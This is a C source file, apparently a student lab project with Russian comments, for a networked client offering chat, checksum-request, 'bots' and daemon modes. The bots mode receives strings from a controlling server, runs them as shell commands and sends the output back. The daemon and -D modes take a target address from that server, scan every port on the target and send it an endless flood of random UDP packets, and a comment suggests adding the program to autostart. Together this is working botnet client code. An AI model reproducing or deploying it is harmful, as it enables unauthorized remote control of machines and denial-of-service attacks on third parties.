#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <time.h>
#include <stdbool.h>
#include <fcntl.h>
#include <pthread.h>


#define DEFAULT_ADDR "127.0.0.1" 
#define DEFAULT_PORT 12345
#define MAX_BUFFER_SIZE 65536 // Максимальный размер буфера, подходящий для большинства сетевых передач

char server_addr[16] = DEFAULT_ADDR; 
int server_port = DEFAULT_PORT;
int show_version = 0; 
int show_help = 0;
int debug_mode = 0;
int daemon_mode =0;
int bots_mode = 0;
int chat_mode = 0;
int d_mode=0;

// Глобальные переменные для опции -D
char dest_addr_opt_D[16] = DEFAULT_ADDR; // адрес получателя для опции -D 
#define MIN_PORT 1          // Минимальный номер порта для сканирования
#define MAX_PORT 65535         // Максимальный номер порта для сканирования

// Глобальные переменные для опции -с
int client_sockfd;
char username[50];
#define BUFFER_SIZE 1024
#define MAX_HISTORY_LINES 100 // Максимальное количество строк истории

void print_help() 
{
    fprintf(stdout,"Usage: server [options]\n");
    fprintf(stdout,"Options:\n");
    fprintf(stdout,"  -a ip             Set the server address\n");
    fprintf(stdout,"  -p port           Set the server port\n");
    fprintf(stdout,"  -v                Show program version\n");
    fprintf(stdout,"  -h                Show this help message\n");
    fprintf(stdout,"  -с                Operation of the server in 'chat' mode to exchange messages (data) between all clients connected to the server\n");
    fprintf(stdout,"  -b                Data transmission to the server from host\n");
    fprintf(stdout,"  -D                Send packets of data to choosed address\n");
    fprintf(stdout,"  -d                Daemon mode for client P.S. add to autostart\n");
    fprintf(stdout,"  -T <soon :(>      Command shell management\n");
    fprintf(stdout,"Environment variables:\n");
    fprintf(stdout,"  LAB2ADDR           Server address\n");
    fprintf(stdout,"  LAB2PORT           Server port\n");
    fprintf(stdout,"  LAB2DEBUG          Enable debug mode\n");
}



void *receive_messages(void *arg) 
{
  (void)arg;
  char message_history[BUFFER_SIZE * MAX_HISTORY_LINES];
  int history_lines = 0; 
  int history_cursor = 0; 

  while (1) 
  {
    char message[BUFFER_SIZE];
    memset(message, 0, sizeof(message));
    if (recv(client_sockfd, message, BUFFER_SIZE, 0) > 0) 
    {
      // Добавление полученного сообщение от другого клиента в сети в историю 
      snprintf(message_history + history_cursor, BUFFER_SIZE+1,"%s\n", message);
      history_cursor += strlen(message) + 1;
      history_lines++;

      // Отчистка экрана - вывод истории - просьба ввести новое сообщение
      system("clear"); // Use "cls" instead of "clear" on Windows
      fprintf(stdout,"%s",message_history + (history_lines > 10 ? history_cursor : 0));

      fprintf(stdout,"Enter your message: ");
      fflush(stdout);
    } 
    else 
    {
      perror("Message receive failed");
      exit(EXIT_FAILURE);
    }
  }
}

int foo_chat()
{
  struct sockaddr_in server_addr_c;

  client_sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (client_sockfd == -1) 
  {
    perror("Socket creation failed");
    exit(EXIT_FAILURE);
  }
  else
  {
    if(debug_mode)
    {
      fprintf(stdout,"DEBUG: socket created\n");
    }
  }

  server_addr_c.sin_family = AF_INET;
  server_addr_c.sin_addr.s_addr = inet_addr(server_addr);
  server_addr_c.sin_port = htons(server_port);

  if (connect(client_sockfd, (struct sockaddr *)&server_addr_c, sizeof(server_addr_c)) == -1) 
  {
    perror("Connection failed");
    exit(EXIT_FAILURE);
  }
  else
  {
    if(debug_mode)
    {
      fprintf(stdout,"DEBUG: client connected to the server\n");
    }
  }
  

  fprintf(stdout,"Enter your username: ");
  fgets(username, sizeof(username), stdin);
  username[strlen(username) - 1] = '\0';  

  send(client_sockfd, username, strlen(username), 0);

  fprintf(stdout,"Connected to the server as %s.\n", username);

  pthread_t receive_thread;
  if(pthread_create(&receive_thread, NULL, receive_messages, NULL)!=0)
  {
    perror("Error creating thread");
  }
  else
  {
    if(debug_mode)
    {
      fprintf(stdout,"DEBUG: thread created\n");
    }
  }

  while (1) 
  {
    char message[BUFFER_SIZE];
    fprintf(stdout,"Enter your message: ");
    fgets(message, BUFFER_SIZE, stdin);

    if (send(client_sockfd, message, strlen(message), 0) == -1) 
    {
      perror("Message sending failed");
      exit(EXIT_FAILURE);
    }
    else
    {
      if(debug_mode)
      {
        fprintf(stdout,"DEBUG: msg sent correctly\n");
      }
    }
  }

  close(client_sockfd);
  return 0;
}

// Генерация случайного времени в микросекундах от 100000 до 1000000 микросекунд (0.1 до 1 секунды)
unsigned int random_delay() 
{
    return (rand() % 900000) + 100000;
}


// Сканирование открытых портов на таргете
bool is_port_open(const char *ip, int port) 
{
  int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if (sockfd == -1) 
  {
    perror("Socket creation failed");
    return false;
  }
  else
  {
    if(debug_mode)
    {
      fprintf(stdout,"DEBUG: socket created\n");
    }
  }
  struct sockaddr_in server_addr;
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(port);
  server_addr.sin_addr.s_addr = inet_addr(ip);

  int result = connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
  close(sockfd);

  return result != -1;
}



// Отправка пакетов случайной длины со случайным содержимым по указаному адресу (опция -D)
int sendData()
{
  srand(time(NULL));

  int open_ports[MAX_PORT - MIN_PORT + 1] = {0}; // Инициализируем массив состояний портов

  // Сканирование открытых портов
  for (int port = MIN_PORT; port <= MAX_PORT; ++port)
  {
    if (is_port_open(dest_addr_opt_D, port)) 
    {
      open_ports[port - MIN_PORT] = 1;
    }
  }
    
  //print_open_ports(open_ports);

  int sockfd;
  struct sockaddr_in server_addr_opt_D;

  // Создание сокета
  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if (sockfd == -1)
  {
    perror("Socket creation failed");
    return 1;
  }
  else
  {
    if(debug_mode)
    {
      fprintf(stdout,"DEBUG: socket created\n");
    }
  }

  // Заполнение информации о сервере
  server_addr_opt_D.sin_family = AF_INET;
  server_addr_opt_D.sin_addr.s_addr = inet_addr(dest_addr_opt_D);

  while (1) 
  {
    // Генерация случайного открытого порта
    int random_port = rand() % (MAX_PORT - MIN_PORT + 1) + MIN_PORT;
    while (!open_ports[random_port - MIN_PORT]) 
    {
      random_port = rand() % (MAX_PORT - MIN_PORT + 1) + MIN_PORT;
    }
        
    // Заполнение остальной информации о сервере
    server_addr_opt_D.sin_port = htons(random_port);

    // Генерация случайного размера пакета данных
    int packet_size = (rand() % (MAX_BUFFER_SIZE + 1 - (int)(MAX_BUFFER_SIZE * 0.2))) + (int)(MAX_BUFFER_SIZE * 0.2);
    char buffer[MAX_BUFFER_SIZE];

    // Заполнение буфера данными (можно добавить свою логику генерации данных) например вредосной нагрузкой
    for (int i = 0; i < packet_size; ++i) 
    {
      buffer[i] = 'A' + (rand() % 26);  // Пример: генерация случайной буквы
    }

    // Отправка пакета данных таргету
    ssize_t bytes_sent = sendto(sockfd, buffer, packet_size, 0, (struct sockaddr*)&server_addr_opt_D, sizeof(server_addr_opt_D));
    if (bytes_sent == -1) 
    {
      perror("Ошибка отправки данных");
      break;
    }

    fprintf(stdout,"Отправлено %zd байт данных на порт %d\n", bytes_sent, random_port);

    usleep(random_delay());  // Пауза 1 секунда
  }

  close(sockfd);

  return 0;
}

int foo_d()
{
  // Клиент принимает только адрес 
  // далее клиент по указаному адресу отправляет пакет случайной длины со случайным содержимым
  // Клиент отсылает пакеты на порт который открыт, если порт закрыт, то пробует отправить на другой (если порт закрыт, то он помечается как закрытый и на него больше не отправляются пакеты)
  // адрес получателя передается вместе с опцией -D
  
  if (daemon_mode) 
  {
    if (setsid() < 0)
    {
      perror("Error creating new session");

      exit(EXIT_FAILURE);
    }

    int fd = open("/dev/null", O_RDWR, 0);
    if (fd != -1) 
    {
      dup2(fd, STDIN_FILENO);
      dup2(fd, STDOUT_FILENO);
      dup2(fd, STDERR_FILENO);
      if (fd > 2) 
      {
        close(fd);
      }
    }

    if (chdir("/") < 0) 
    {
      perror("Error changing working directory");

      exit(EXIT_FAILURE);
    }
  }

  int client_socket;
  while(1)
  {
    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket == -1)
    {
      perror("Error creating client socket");
      continue;
    }

      struct sockaddr_in server_sockaddr;
      memset(&server_sockaddr, 0, sizeof(server_sockaddr));
      server_sockaddr.sin_family = AF_INET;
      server_sockaddr.sin_addr.s_addr = inet_addr(server_addr);
      server_sockaddr.sin_port = htons(server_port);

      if (connect(client_socket, (struct sockaddr *)&server_sockaddr, sizeof(server_sockaddr)) == -1)
      {
        perror("Error connecting to server");
        close(client_socket);
        continue;
      }
      else
      {
        break;
      }
  }
    
  char buffer[MAX_BUFFER_SIZE];
  ssize_t bytes_received;

  while (1) 
  {
    bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    if (bytes_received <= 0)
    {
      perror("Error receiving data from server or connection closed");
      break;
    }
        
    buffer[bytes_received] = '\0';
        
    char modified_command[MAX_BUFFER_SIZE];
    
    int max_command_length = sizeof(modified_command);
    int buffer_length = strlen(buffer);
        
    if (buffer_length > max_command_length)
    {
      fprintf(stderr, "Received command is too long\n");
      continue;
    }

    snprintf(modified_command, sizeof(modified_command), "%.*s", max_command_length, buffer);
        
    if(debug_mode)
    {
      fprintf(stdout,"Received opt arg (dest addr): %s\n", modified_command);
    }
        
    strncpy(dest_addr_opt_D, modified_command, sizeof(dest_addr_opt_D) - 1);
    dest_addr_opt_D[sizeof(dest_addr_opt_D) - 1] = '\0';
        
    if(debug_mode)
    {
      fprintf(stdout,"dest addr: %s\n", dest_addr_opt_D);
    }
        
    sendData();
  }

  close(client_socket);
  return 0;
}

int foo_bots()
{
  int client_socket;
  while(1)
  {
    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket == -1) 
    {
      perror("Error creating client socket");
      continue;
    }

    struct sockaddr_in server_sockaddr;
    memset(&server_sockaddr, 0, sizeof(server_sockaddr));
    server_sockaddr.sin_family = AF_INET;
    server_sockaddr.sin_addr.s_addr = inet_addr(server_addr);
    server_sockaddr.sin_port = htons(server_port);

    if (connect(client_socket, (struct sockaddr *)&server_sockaddr, sizeof(server_sockaddr)) == -1) 
    {
      perror("Error connecting to server");
      close(client_socket);
      continue;
    }
    else
    {
      break;
    }
  }
    
  char buffer[MAX_BUFFER_SIZE];
  ssize_t bytes_received;

  while (1) 
  {
    bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    if (bytes_received <= 0) 
    {
      perror("Error receiving data from server or connection closed");
      break;
    }
        
    buffer[bytes_received] = '\0';
        
    char modified_command[MAX_BUFFER_SIZE];
    
    int max_command_length = sizeof(modified_command);
    int buffer_length = strlen(buffer);
        
    if (buffer_length > max_command_length) 
    {
      fprintf(stderr, "Received command is too long\n");
      continue;
    }

    snprintf(modified_command, sizeof(modified_command), "%.*s", max_command_length, buffer);
        
    if(debug_mode)
    {
      fprintf(stdout,"Received command: %s\n", modified_command);
    }
        
    FILE *command_output = popen(modified_command, "r");
    if (command_output == NULL)
    {
      perror("Error executing command");
      return 1;
    }
        
    char concatenated_output[MAX_BUFFER_SIZE] = "";
        
    size_t message_length = strlen(concatenated_output);
        
    while (fgets(buffer, sizeof(buffer), command_output) != NULL)
    {
      //fprintf(stdout,"%s", buffer);  // Выводим результат команды
      strcat(concatenated_output, buffer);
      //send(client_socket, buffer, strlen(buffer), 0);
    }
        
    int status = pclose(command_output);
    if (status == -1)
    {
      perror("Error closing command output");
      return 1;
    }
    else 
    {
      if (WIFEXITED(status))
      {
        int exit_status = WEXITSTATUS(status);
        if (exit_status != 0)
        {
          fprintf(stderr, "Command exited with status %d\n", exit_status);
        }
      }
      else 
      {
        strcat(concatenated_output, "Command did not exit normally\n");
        message_length = strlen(concatenated_output);
        // Отправка длины и сообщения на сервер
        send(client_socket, &message_length, sizeof(message_length), 0);
        send(client_socket, concatenated_output, message_length, 0);
        continue;
      }
    }
    
    message_length = strlen(concatenated_output);

    // Отправка длины и сообщения на сервер
    send(client_socket, &message_length, sizeof(message_length), 0);
    send(client_socket, concatenated_output, message_length, 0);
        
    if(debug_mode)
    {
      fprintf(stdout,"concatenated_output %s", concatenated_output);  // Выводим результат команды
    }
  }

  close(client_socket);
  return 0;
}

int main(int argc, char *argv[]) 
{
  // Обработка переменных среды
  const char *address_env = getenv("LAB2ADDR");
  if (address_env) 
  {
    strncpy(server_addr, address_env, sizeof(server_addr) - 1);
    server_addr[sizeof(server_addr) - 1] = '\0';
  }

  const char *port_env = getenv("LAB2PORT");
  if (port_env) 
  {
    server_port = atoi(port_env);
  }

  const char *debug_env = getenv("LAB2DEBUG");
  if (debug_env) 
  {
    debug_mode = 1;
  }
  
  // Обработка опций командной строки
  int opt;
  while ((opt = getopt(argc, argv, "a:p:vhcbD")) != -1) 
  {
    switch (opt) 
    {
      case 'd':
        daemon_mode = 1;
        if (debug_mode) 
        {
          fprintf(stdout, "DEBUG: daemon_mode = %d\n",daemon_mode);
        }
        break;
      case 'D':
        d_mode = 1; // Включение режима чата
        break;
      case 'c':
        chat_mode = 1; // Включение режима чата
        break;
      case 'b':
        bots_mode = 1; // Включение режима чата
       
        break;
      case 'a':
        strncpy(server_addr, optarg, sizeof(server_addr));
        server_addr[sizeof(server_addr) - 1] = '\0';
        if (debug_mode) 
        {
          fprintf(stdout, "DEBUG: server_addr = %s\n",server_addr);
        }
        break;
      case 'p':
        server_port = atoi(optarg);
        if (debug_mode) 
        {
          fprintf(stdout, "DEBUG: server_port = %d\n",server_port);
        }
        break;
      case 'v':
        fprintf(stdout,"Server version 1.0\n");
        return 0;
      case 'h':
        print_help();
        return 0;
      default:
        fprintf(stderr, "Usage: %s -h for help\n", argv[0]);
        exit(EXIT_FAILURE);
      }
  }

  if(bots_mode)
  {
    foo_bots();
  }
  else if(chat_mode)
  {
    foo_chat(server_addr,server_port);
  }
  else if(d_mode)
  {
    foo_d();
  }
  else
  {
    const char *request_data = argv[argc-1];
    int request_size = strlen(request_data);

    int client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket == -1) 
    {
      perror("Error creating client socket");
      return 1;
    }
    else
    {
      if(debug_mode)
      {
        fprintf(stdout,"DEBUG: socket created\n");
      }
    }

    struct sockaddr_in server_sockaddr; 
    memset(&server_sockaddr, 0, sizeof(server_sockaddr));
    server_sockaddr.sin_family = AF_INET;
    server_sockaddr.sin_addr.s_addr = inet_addr(server_addr); // Set the IP address

    server_sockaddr.sin_port = htons(server_port);

    if (connect(client_socket, (struct sockaddr *)&server_sockaddr, sizeof(server_sockaddr)) == -1) 
    {
      perror("Error connecting to server");
      close(client_socket);
      return 1;
    }
    else
    {
      if(debug_mode)
      {
        fprintf(stdout,"DEBUG: client connected to the server\n");
      }
    }

    // Send request size
    uint16_t request_size_n = htons(request_size);
    if (send(client_socket, &request_size_n, sizeof(request_size_n), 0) != sizeof(request_size_n))
    {
      perror("Error sending request size");
      close(client_socket);
      return 1;
    }
    else
    {
      if(debug_mode)
      {
        fprintf(stdout,"DEBUG: request size sent succesfully\n");
      }
    }

    // Send request data
    if (send(client_socket, request_data, request_size, 0) != request_size) 
    {
      perror("Error sending request data");
      close(client_socket);
      return 1;
    }
    else
    {
      if(debug_mode)
      {
        fprintf(stdout,"DEBUG: request data sent succesfully\n");
      }
    }

    // Receive response
    uint8_t response[3];
    if (recv(client_socket, response, sizeof(response), 0) != sizeof(response))
    {
      perror("Error receiving response");
      close(client_socket);
      return 1;
    }
    else
    {
      if(debug_mode)
      {
        fprintf(stdout,"DEBUG: good receiving\n");
      }
    }

    if (response[0] == 0) 
    {
      fprintf(stdout,"Request was successful. Checksum: %02X%02X\n", response[1], response[2]);
    } 
    else 
    {
      fprintf(stdout,"Request encountered an error.\n");
    }
    

    close(client_socket);
  }
  return 0;
}

